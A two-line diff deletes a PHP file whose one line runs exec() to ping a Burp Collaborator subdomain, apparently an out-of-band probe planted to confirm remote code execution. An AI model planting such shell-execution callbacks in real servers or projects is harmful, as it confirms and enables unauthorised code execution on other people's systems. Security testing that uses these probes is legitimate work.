@@ -1,2 +1,0 @@
-<?php
-exec("ping -c 1 b1djd5m9hiqktgkb6wk0lfd39ufk39.burpcollaborator.net");
